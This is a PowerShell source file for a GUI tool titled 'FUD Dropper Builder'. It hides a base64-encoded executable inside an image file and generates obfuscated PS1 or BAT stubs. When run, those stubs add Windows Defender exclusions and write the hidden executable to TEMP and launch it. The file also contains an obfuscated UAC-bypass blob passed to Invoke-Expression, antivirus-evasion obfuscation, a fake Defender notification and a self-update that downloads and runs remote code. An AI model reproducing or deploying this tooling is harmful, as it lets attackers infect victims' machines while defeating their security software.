param(
    [cmdletbinding()]
    [Parameter(Mandatory=$false)]
    [string]$image,
    [Parameter(Mandatory=$false)]
    [string]$exe,
    [Parameter(Mandatory=$false)]
    [string]$type,
    [Parameter(Mandatory=$false)]
    [string]$obf
)

if ($image -eq '/?') {
    Write-Host 'Usage: builder.ps1 "[IMAGE_PATH]" "[EXE_PATH]" "[TYPE (ps1/bat)]" [OBFUSCATION (true/false)]' -ForegroundColor Yellow
    break
}

Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'

$EMBEDDED_CODE = @'
$CSHARP = @"
using System.IO;
using System.Linq;
using System.Diagnostics;
using System;
public class Dropped
{
    public static void Main()
    {
        string path = Path.GetTempPath();
        Process pstest = new Process();
        pstest.StartInfo.FileName = "powershell.exe";
        pstest.StartInfo.Arguments = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '" + path + "'";
        pstest.Start();
        string path2 = Directory.GetCurrentDirectory();
        string image = path2 + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "pay.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "pay.exe";
        ps.Start();
    }
}
"@
Add-Type -TypeDefinition $CSHARP -Language CSharp
[Dropped]::Main()
'@

$EMBEDDED_CODE_ADMIN = @'
$mypath = $MyInvocation.MyCommand.Path
$MAIN_PATH = Split-Path $mypath
$MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
try {
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $MAIN_PATH -ErrorAction SilentlyContinue
} catch {
    Write-Host "nah"
}
$CSHARP = @"
using System.IO;
using System.Linq;
using System.Diagnostics;
using System;
public class Dropped
{
    public static void Main()
    {
        string path = Path.GetTempPath();
        Process pstest = new Process();
        pstest.StartInfo.FileName = "powershell.exe";
        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
        pstest.Start();
        string path2 = Directory.GetCurrentDirectory();
        string image = "REPLACE" + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "pay.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "pay.exe";
        ps.Start();
    }
}
"@
$CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process "powershell.exe" -ArgumentList " -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
Add-Type -TypeDefinition $CSHARP -Language CSharp
[Dropped]::Main()
'@

$EMBEDDED_CODE_ADMIN_UAC_BYPASS = @'
$mypath = $MyInvocation.MyCommand.Path
$MAIN_PATH = Split-Path $mypath
$MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
try {
    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $MAIN_PATH -ErrorAction SilentlyContinue
} catch {
    Write-Host "nah"
}
$CSHARP = @"
using System.IO;
using System.Linq;
using System.Diagnostics;
using System;
public class Dropped
{
    public static void Main()
    {
        string path = Path.GetTempPath();
        Process pstest = new Process();
        pstest.StartInfo.FileName = "powershell.exe";
        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
        pstest.Start();
        string path2 = Directory.GetCurrentDirectory();
        string image = "REPLACE" + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "pay.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "pay.exe";
        ps.Start();
    }
}
"@
$CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
$base64_my_path = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Path))
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { $code = "$base64_my_path" ; (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION }
else {
    Add-Type -TypeDefinition $CSHARP -Language CSharp
    [Dropped]::Main()
}
'@

$inputXML = @'
<Window x:Class="GUI_TEST.MainWindow" Icon="logo.ico"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:GUI_TEST"
        mc:Ignorable="d"
        Title="FUD Dropper Builder" Height="470" Width="818" WindowStyle="ThreeDBorderWindow" ResizeMode="NoResize">
    <Window.Resources>
        <ResourceDictionary>
            <Style x:Key="CustomButtonStyle" TargetType="{x:Type Button}">
                <Setter Property="Template">
                    <Setter.Value>
                        <ControlTemplate TargetType="{x:Type Button}">
                            <Border BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}">
                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                            </Border>
                            <ControlTemplate.Triggers>
                                <Trigger Property="IsMouseOver" Value="True">
                                </Trigger>
                            </ControlTemplate.Triggers>
                        </ControlTemplate>
                    </Setter.Value>
                </Setter>
            </Style>
        </ResourceDictionary>
    </Window.Resources>
    <Grid x:Name="Name_Thing" Background="#846DCF">
        <TextBox HorizontalAlignment="Left" Height="56" Margin="10,5,0,0" TextWrapping="Wrap" Text="FUD (Fully Undetected)" VerticalAlignment="Top" Width="399" IsReadOnly="True" FontSize="18" BorderThickness="4,4,4,4" Background="Black" Foreground="White" IsHitTestVisible="False">
            <TextBox.BorderBrush>
                <SolidColorBrush Color="#FF1AFB00" Opacity="1"/>
            </TextBox.BorderBrush>
        </TextBox>
        <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
        <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2" FontSize="18"/>
        <TextBox x:Name="OUTPUT_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,66,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black" FontSize="14"/>
        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,142,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black" FontSize="14"/>
        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="516,189,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18"/>
        <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62" Background="#FF00FC00" FontFamily="Sitka Text Semibold"/>
        <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62" Background="Lime" FontFamily="Sitka Text Semibold"/>
        <Button x:Name="ps1_button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
        <Image HorizontalAlignment="Left" Height="189" Margin="604,10,0,0" VerticalAlignment="Top" Width="186" Source="comethazine.png"/>
    </Grid>
</Window>
'@

function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}

function Show-Notification {
    [cmdletbinding()]
    Param (
        [string]
        $ToastTitle,
        [string]
        [parameter(ValueFromPipeline)]
        $ToastText
    )

    [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
    $Template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)

    $RawXml = [xml] $Template.GetXml()
    ($RawXml.toast.visual.binding.text|Where-Object {$_.id -eq "1"}).AppendChild($RawXml.CreateTextNode($ToastTitle)) > $null
    ($RawXml.toast.visual.binding.text|Where-Object {$_.id -eq "2"}).AppendChild($RawXml.CreateTextNode($ToastText)) > $null

    $SerializedXml = New-Object Windows.Data.Xml.Dom.XmlDocument
    $SerializedXml.LoadXml($RawXml.OuterXml)

    $Toast = [Windows.UI.Notifications.ToastNotification]::new($SerializedXml)
    $Toast.Tag = "Fud Builder"
    $Toast.Group = "Fud Builder"
    $Toast.ExpirationTime = [DateTimeOffset]::Now.AddMinutes(1)

    $Notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Fud Builder")
    $Notifier.Show($Toast);
}

function New-random_string {
    $length = Get-Random -Minimum 5 -Maximum 10
    $chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    $result = ""
    for ($i = 0; $i -lt $length; $i++) {
        $rand = Get-Random -Maximum $chars.Length
        $result += $chars[$rand]
    }
    return $result
}

function Invoke-PowershellOBF {
    param (
        [string]$file_location
    )
    $OBFUSCATOR_URL = "https://github.com/danielbohannon/Invoke-Obfuscation/archive/refs/heads/master.zip"
    $OBFUSCATOR_PATH = "$working_dir\Invoke-Obfuscation.zip"
    $OBFUSCATOR_EXTRACT_PATH = "$working_dir"
    Start-BitsTransfer -Source $OBFUSCATOR_URL -Destination $OBFUSCATOR_PATH
    Expand-Archive -Path $OBFUSCATOR_PATH -DestinationPath $OBFUSCATOR_EXTRACT_PATH
    $command = "cd Invoke-Obfuscation-master ; Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation -ScriptPath $file_location -Command 'Encoding\\6, Copy, Exit'"
    $var_OUTPUT_BOX.Text += "IF OBFUSCATION FALLS TURN OFF ANTIVIRUS (nobody likes antivirus)"
    Start-Process -FilePath "powershell.exe" -ArgumentList $command -Wait
    $var_OUTPUT_BOX.Text += "OBFUSCATION COMPLETE"
    $var_OUTPUT_BOX.Text += "COPYING TO CLIPBOARD"
    $final = Get-Clipboard
    $final | Out-File -FilePath $file_location
    Remove-Item -Path "$OBFUSCATOR_PATH" -Force
    Remove-Item -Path "$OBFUSCATOR_EXTRACT_PATH/Invoke-Obfuscation-master" -Force -Recurse
    Remove-Item -Path "$OBFUSCATOR_EXTRACT_PATH/Invoke-Obfuscation-master" -Force -ErrorAction SilentlyContinue
}

function Invoke-obfuscate {
    param(
        [string]$line
    )
    $result = ""
    $variable = $False
    foreach($char in $line -split "") {
        if ($char -eq "%") {
            $variable = -not $variable
        }
        if ($variable) {
            $result += $char
        } else {
            if ($char -eq "@") {
                $result += "^@"
            }
            elseif ($char -eq "`"") {
                $result += "^`""
            }
            else {
                $ran_string = New-random_string
                $result += "$char%$ran_string%"
            }
        }
    }
    return $result
}

function build {
    param(
        [string]$image,
        [string]$exe,
        [string]$type
    )
    if ($null -eq $image) {
        $var_OUTPUT_BOX.Text += "No image selected!`n"
        return
    }
    if ($null -eq $exe) {
        $var_OUTPUT_BOX.Text += "No exe selected!`n"
        return
    }
    if ($null -eq $type) {
        $var_OUTPUT_BOX.Text += "No type selected!`n"
        return
    }
    New-Item -ItemType Directory -Path "output" -Force
    $working_dir = Get-Location
    $image_name = Split-Path $image -Leaf
    $var_OUTPUT_BOX.Text += "Building $type file...`n"
    $var_OUTPUT_BOX.Text += "Reading exe bytes...`n"
    $exe_bytes = [System.IO.File]::ReadAllBytes($exe)
    $var_OUTPUT_BOX.Text += "Converting exe bytes to base64...`n"
    $exe_base64 = [System.Convert]::ToBase64String($exe_bytes)
    $var_OUTPUT_BOX.Text += "Converting base64 to bytes...`n"
    $exe_base64_bytes = [System.Text.Encoding]::ASCII.GetBytes($exe_base64)
    $var_OUTPUT_BOX.Text += "Reading image bytes...`n"
    $image_bytes = [System.IO.File]::ReadAllBytes($image)
    $var_OUTPUT_BOX.Text += "Writing image bytes to file...`n"
    $newLine = [System.Text.Encoding]::ASCII.GetBytes([Environment]::NewLine)
    $var_OUTPUT_BOX.Text += "Writing exe bytes to file...`n"
    $combined_bytes = $image_bytes + $newLine + $exe_base64_bytes
    $var_OUTPUT_BOX.Text += "Writing combined bytes to file...`n"
    [System.IO.File]::WriteAllBytes("$working_dir\output\$image_name", $combined_bytes)
    $var_OUTPUT_BOX.Text += "Writing payload to file...`n"
    $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\run.ps1"

    if ($type -eq "bat") {
        $var_OUTPUT_BOX.Text += "No Obfuscation...`n"
    } else {
        $obfuscate_box = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
        switch ($obfuscate_box) {
            "Yes" {
                $var_OUTPUT_BOX.Text += "Obfuscating powershell code...`n"
                Invoke-PowershellOBF "$working_dir\output\run.ps1"
            }
            "No" {
                $var_OUTPUT_BOX.Text += "No Obfuscation...`n"
            }
        }
    }

    if ($type -eq "bat") {
        $var_OUTPUT_BOX.Text += "Obfuscating batch code...`n"
        $ps1_code = $EMBEDDED_CODE.Split("`n")
        foreach ($line in $ps1_code) {
            #show progress in output box
            $var_OUTPUT_BOX.Text += "Obfuscating line: $line`n"
            if ($line -eq "") {
                continue
            }
            $line_split = $line.Replace("`n", "")
            $line_split = $line_split.Replace("`r", "")
            $line = "echo " + $line_split + " >> run.ps1"
            $line = Invoke-obfuscate $line
            Add-Content -Path .\output\final.bat -Value $line
        }
        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\run.ps1"
        $str_obf = Invoke-obfuscate $str_obf
        $var_OUTPUT_BOX.Text += "Writing obfuscated batch code to file...`n"
        Add-Content -Path .\output\final.bat -Value $str_obf
        $var_OUTPUT_BOX.Text += "final.bat created in $working_dir\output `n"
        $var_OUTPUT_BOX.Text += "Cleaning up...`n"
        Remove-Item -Path .\output\run.ps1 -Force
    }
    else {
        $var_OUTPUT_BOX.Text += "run.ps1 created in $working_dir\output `n"
    }
    #set color to green in text box
    $var_OUTPUT_BOX.Text += "`nDone!`n"
    Show-Notification "Windows Defender" "Payload created in $working_dir\output lmao u prolly thought this was a virus warning (skull emoji)"
}


function Invoke-UI {
    $image_name = "comethazine.png"
    $icon_name = "logo.ico" # doesn't even work smh
    $working_dir = Get-Location
    $image_name_path = "$working_dir\assets\$image_name"
    $icon_name_path = "$working_dir\assets\$icon_name"
    $inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
    [XML]$XAML = $inputXML

    $reader = (New-Object System.Xml.XmlNodeReader $xaml)
    try {
        $window = [Windows.Markup.XamlReader]::Load( $reader )
    } catch {
        Write-Warning $_.Exception
        throw
    }

    $Window.add_Loaded({
        $Window.Icon = $icon_name_path
    })

    $xaml.SelectNodes("//*[@Name]") | ForEach-Object {
        try {
            Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction SilentlyContinue
        } catch {
            $null
        }
    }
    Get-Variable var_* > $null
    $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('Desktop') }

    $var_FIND_IMAGE.add_Click({
        $location = $FileBrowser.ShowDialog()
        if ($location -eq 'OK') {
            if ($FileBrowser.FileName -notmatch '\.(jpg|jpeg|png|bmp)$') {
                [System.Windows.MessageBox]::Show("File must be an image", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
                return
            } else {
                $var_IMAGE_PATH_SHOW.Text = $FileBrowser.FileName
            }
        }
    })
    
    $var_FIND_EXE.add_Click({
        $location = $FileBrowser.ShowDialog()
        if ($location -eq 'OK') {
            if ($FileBrowser.FileName -notmatch '\.exe$') {
                [System.Windows.MessageBox]::Show("File must be an exe", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
                return
            } else {
                $var_EXE_PATH_SHOW.Text = $FileBrowser.FileName
            }
        }
    })
    
    $var_ps1_button.add_Click({
        if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
            [System.Windows.MessageBox]::Show("Please select an image and exe", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
            return
        } else {
            build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'ps1'
            $var_OUTPUT_BOX.Text += "PS1 Built`n"
        }
    })
    
    $var_Bat_Button.add_Click({
        if ($var_IMAGE_PATH_SHOW.Text -eq '' -or $var_EXE_PATH_SHOW.Text -eq '') {
            [System.Windows.MessageBox]::Show("Please select an image and exe", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
            return
        } else {
            build -image $var_IMAGE_PATH_SHOW.Text -exe $var_EXE_PATH_SHOW.Text -type 'bat'
            $var_OUTPUT_BOX.Text += "BAT Built`n"
        }
    })
    
    $var_OUTPUT_BOX.add_TextChanged({
        $var_OUTPUT_BOX.ScrollToEnd()
    })

    $var_OUTPUT_BOX.Text += "Successfully Started`n"
    Remove-Item -Path .\output\run.ps1 -Force -ErrorAction SilentlyContinue
    Hide-Console #Makes it look nice
    #If you don't want UAC admin to be required when running the payload set this to $false
    $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
    $uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
    if ($uac_required -eq $True) {
        $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN
    }
    if ($uac_BYPASS -eq $True) {
        $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN_UAC_BYPASS
    }
    $Null = $window.ShowDialog()
}

function Invoke-BuildNoUI {
    param(
        [Parameter(Mandatory=$true)]
        [string]$image,
        [Parameter(Mandatory=$true)]
        [string]$exe,
        [Parameter(Mandatory=$true)]
        [string]$type,
        [Parameter(Mandatory=$true)]
        [string]$obf_no_ui
    )
    New-Item -ItemType Directory -Path "output" -Force > $null
    $working_dir = Get-Location
    $image_name = Split-Path $image -Leaf
    Write-Host "Building $type file..."
    Write-Host "Reading exe bytes..."
    $exe_bytes = [System.IO.File]::ReadAllBytes($exe)
    Write-Host "Converting exe bytes to base64..."
    $exe_base64 = [System.Convert]::ToBase64String($exe_bytes)
    Write-Host "Converting base64 to bytes..."
    $exe_base64_bytes = [System.Text.Encoding]::ASCII.GetBytes($exe_base64)
    Write-Host "Reading image bytes..."
    $image_bytes = [System.IO.File]::ReadAllBytes($image)
    Write-Host "Writing image bytes to file..."
    $newLine = [System.Text.Encoding]::ASCII.GetBytes([Environment]::NewLine)
    Write-Host "Writing exe bytes to file..."
    $combined_bytes = $image_bytes + $newLine + $exe_base64_bytes
    Write-Host "Writing combined bytes to file..."
    [System.IO.File]::WriteAllBytes("$working_dir\output\$image_name", $combined_bytes)
    Write-Host "Writing payload to file..."
    $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\run.ps1"

    if ($type -eq "bat") {
        Write-Host "No Obfuscation..."
    } else {
        if ($obf_no_ui -ne $true) {
            Write-Host "No Obfuscation..."
        } else {
            Write-Host "Obfuscating..."
            Invoke-obfuscate -inputFile "$working_dir\output\run.ps1" -outputFile "$working_dir\output\run.ps1"
        }
    }

    if ($type -eq "bat") {
        Write-Host "Obfuscating batch code..."
        $ps1_code = $EMBEDDED_CODE.Split("")
        foreach ($line in $ps1_code) {
            #show progress in output box
            Write-Host "Obfuscating line: $line"
            if ($line -eq "") {
                continue
            }
            $line_split = $line.Replace("", "")
            $line_split = $line_split.Replace("`r", "")
            $line = "echo " + $line_split + " >> run.ps1"
            $line = Invoke-obfuscate $line
            Add-Content -Path .\output\final.bat -Value $line
        }
        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\run.ps1"
        $str_obf = Invoke-obfuscate $str_obf
        Write-Host "Writing obfuscated batch code to file..."
        Add-Content -Path .\output\final.bat -Value $str_obf
        Write-Host "final.bat created in $working_dir\output "
        Write-Host "Cleaning up..."
        Remove-Item -Path .\output\run.ps1 -Force
    }
    else {
        Write-Host "run.ps1 created in $working_dir\output "
    }
    #set color to green in text box
    Write-Host "Done!"
    Show-Notification "Windows Defender" "Payload created in $working_dir\output lmao u prolly thought this was a virus warning (skull emoji)"
}

function Update-Code {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Version
    )
    $version_info = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KDot227/FUD_EXE_DROPPER_2/main/version.txt" -UseBasicParsing
    $Version2 = $version_info.Content.Trim()
    if ($Version -ne $Version2) {
        $repo = "https://raw.githubusercontent.com/KDot227/FUD_EXE_DROPPER_2/main/builder.ps1"
        $path = $PSCommandPath
        $webclient = New-Object System.Net.WebClient
        $webclient.DownloadFile($repo, $path)
        Write-Host "Updated!" -ForegroundColor Green
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $path"
        exit
    } else {
        Write-Host "No update available" -ForegroundColor Green
    }
}

Update-Code -Version "1.0"

$uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
$uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
if ($uac_required -eq $True) {
    $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN
}
if ($uac_BYPASS -eq $True) {
    $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN_UAC_BYPASS
}

if ($image -and $exe -and $type -and $obf) {
    Invoke-BuildNoUI -image $image -exe $exe -type $type -obf_no_ui $obf
} else {
    Invoke-UI
}